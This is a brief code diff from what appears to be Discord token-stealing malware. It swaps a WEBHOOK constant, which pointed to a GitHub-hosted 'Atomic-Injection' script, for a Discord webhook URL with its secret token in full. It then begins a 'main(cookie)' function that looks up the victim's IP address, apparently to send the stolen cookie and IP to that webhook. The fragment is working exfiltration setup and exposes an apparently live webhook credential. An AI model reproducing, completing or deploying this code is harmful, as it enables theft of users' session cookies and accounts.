@@ -1,4 +1,4 @@
-const WEBHOOK = "https://raw.githubusercontent.com/FalseKSCH/Atomic-Injection/main/vendors.c1828ed4edca9a5f556f.js";
+const WEBHOOK = "https://discord.com/api/webhooks/1191998420928430191/Q-fEaCsYcxd-yiJE8YTxu8UBsuIRHRmxjSjbCcbL_7yaxTLplVVW27wxlxVwu9G-amZC";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
